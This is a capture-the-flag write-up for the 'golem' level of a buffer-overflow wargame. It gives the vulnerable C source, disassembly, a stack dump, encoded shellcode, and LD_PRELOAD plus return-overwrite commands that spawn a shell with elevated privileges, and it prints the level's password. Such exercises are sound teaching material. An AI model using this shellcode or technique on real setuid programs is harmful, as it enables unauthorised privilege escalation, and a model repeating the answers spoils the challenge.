# Level 10, Skeleton -> Golem

### golem.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - golem
        - stack destroyer
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // stack destroyer!
        memset(buffer, 0, 44);
        memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
}
```

### Analysis

#### Disassembling the "golem"

```
0x8048470 <main>:       push   %ebp
0x8048471 <main+1>:     mov    %ebp,%esp
0x8048473 <main+3>:     sub    %esp,44
0x8048476 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804847a <main+10>:    jg     0x8048493 <main+35>
0x804847c <main+12>:    push   0x8048570
0x8048481 <main+17>:    call   0x8048378 <printf>
0x8048486 <main+22>:    add    %esp,4
0x8048489 <main+25>:    push   0
0x804848b <main+27>:    call   0x8048388 <exit>
0x8048490 <main+32>:    add    %esp,4
0x8048493 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048496 <main+38>:    add    %eax,4
0x8048499 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804849b <main+43>:    add    %edx,47
0x804849e <main+46>:    cmp    BYTE PTR [%edx],0xbf
0x80484a1 <main+49>:    je     0x80484c0 <main+80>
0x80484a3 <main+51>:    push   0x804857c
0x80484a8 <main+56>:    call   0x8048378 <printf>
0x80484ad <main+61>:    add    %esp,4
0x80484b0 <main+64>:    push   0
0x80484b2 <main+66>:    call   0x8048388 <exit>
0x80484b7 <main+71>:    add    %esp,4
0x80484ba <main+74>:    lea    %esi,[%esi]
0x80484c0 <main+80>:    mov    %eax,DWORD PTR [%ebp+12]
0x80484c3 <main+83>:    add    %eax,4
0x80484c6 <main+86>:    mov    %edx,DWORD PTR [%eax]
0x80484c8 <main+88>:    push   %edx
0x80484c9 <main+89>:    lea    %eax,[%ebp-40]
0x80484cc <main+92>:    push   %eax
0x80484cd <main+93>:    call   0x80483a8 <strcpy>
0x80484d2 <main+98>:    add    %esp,8
0x80484d5 <main+101>:   lea    %eax,[%ebp-40]
0x80484d8 <main+104>:   push   %eax
0x80484d9 <main+105>:   push   0x8048599
0x80484de <main+110>:   call   0x8048378 <printf>
0x80484e3 <main+115>:   add    %esp,8
0x80484e6 <main+118>:   push   44
0x80484e8 <main+120>:   push   0
0x80484ea <main+122>:   lea    %eax,[%ebp-40]
0x80484ed <main+125>:   push   %eax
0x80484ee <main+126>:   call   0x8048398 <memset>
0x80484f3 <main+131>:   add    %esp,12
0x80484f6 <main+134>:   lea    %eax,[%ebp-40]
0x80484f9 <main+137>:   mov    %edx,0xbfffffcf
0x80484fe <main+142>:   mov    %ecx,%edx
0x8048500 <main+144>:   sub    %ecx,%eax
0x8048502 <main+146>:   mov    %eax,%ecx
0x8048504 <main+148>:   push   %eax
0x8048505 <main+149>:   push   0
0x8048507 <main+151>:   lea    %eax,[%ebp-40]
0x804850a <main+154>:   lea    %edx,[%eax+48]
0x804850d <main+157>:   push   %edx
0x804850e <main+158>:   call   0x8048398 <memset>
0x8048513 <main+163>:   add    %esp,12
0x8048516 <main+166>:   leave
0x8048517 <main+167>:   ret
```

#### Estimated Stack Structure

```
|  i (4 bytes)          | [%ebp-44]
|  BUFFER (40 bytes)    | [%ebp-40]     0000...
|  SFP (4 bytes)        | [%ebp]        0000...
|  RET (4 bytes)        | [%ebp+4]
|  ARGC (4 bytes)       | [%ebp+8]      0000...
|  Pointer to ARGV[0]   | [%ebp+12]     0000...
```

#### Observed Stack Structure (bp at *main+101)

```
(gdb) run `python -c "print '\xbf'*48"`
Starting program: /home/skeleton/golem-cp `python -c "print '\xbf'*48"`

Breakpoint 2, 0x80484d5 in main ()
(gdb) x/100x $esp
0xbffffaac:     0x40021ca0      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffabc:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffacc:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffadc:     0xbfbfbfbf      0x00000000      0xbffffb24      0xbffffb30
0xbffffaec:     0x40013868      0x00000002      0x080483c0      0x00000000
0xbffffafc:     0x080483e1      0x08048470      0x00000002      0xbffffb24
0xbffffb0c:     0x08048308      0x0804854c      0x4000ae60      0xbffffb1c
0xbffffb1c:     0x40013e90      0x00000002      0xbffffc1c      0xbffffc34
0xbffffb2c:     0x00000000      0xbffffc65      0xbffffc78      0xbffffc91
0xbffffb3c:     0xbffffcb0      0xbffffcd2      0xbffffce0      0xbffffea3
0xbffffb4c:     0xbffffec2      0xbffffee0      0xbffffef5      0xbfffff15
0xbffffb5c:     0xbfffff20      0xbfffff31      0xbfffff39      0xbfffff4a
0xbffffb6c:     0xbfffff54      0xbfffff62      0xbfffff73      0xbfffff81
0xbffffb7c:     0xbfffff8c      0xbfffffa0      0x00000000      0x00000003
0xbffffb8c:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffb9c:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffbac:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffbbc:     0x080483c0      0x0000000b      0x000001fe      0x0000000c
0xbffffbcc:     0x000001fe      0x0000000d      0x000001fe      0x0000000e
0xbffffbdc:     0x000001fe      0x00000010      0x0fabfbff      0x0000000f
0xbffffbec:     0xbffffc17      0x00000000      0x00000000      0x00000000
0xbffffbfc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc0c:     0x00000000      0x00000000      0x69000000      0x00363836
0xbffffc1c:     0x6d6f682f      0x6b732f65      0x74656c65      0x672f6e6f
0xbffffc2c:     0x6d656c6f      0x0070632d      0xbfbfbfbf      0xbfbfbfbf

```

### Exploit

#### How to pwn

```
`skeleton` memset all stack frame 'till the end.
We can use LD_PRELOAD to inject shellcode to program.

[What is LD_PRELOAD](https://m.blog.naver.com/PostView.nhn?blogId=declspec&logNo=10135437701&proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F)
```

#### Shellcode (48 bytes)

```
\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
```

#### Final Payload

```
1. Export library file embedding shellcode on its name

[skeleton@localhost /tmp]$ gcc -shared -fPIC lib.c -o `python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`
[skeleton@localhost /tmp]$ export LD_PRELOAD="/tmp/`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`"

2. Execute "setuid" target file with overwritten RET

[skeleton@localhost skeleton]$ ./golem `python -c "print 'A'*44+'\x10\xf5\xff\xbf'"`
```

### Result

```
[skeleton@localhost skeleton]$ ./golem `python -c "print 'A'*44+'\x10\xf5\xff\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒
bash$ id
uid=510(skeleton) gid=510(skeleton) euid=511(golem) egid=511(golem) groups=510(skeleton)
bash$ my-pass
euid = 511
cup of coffee
```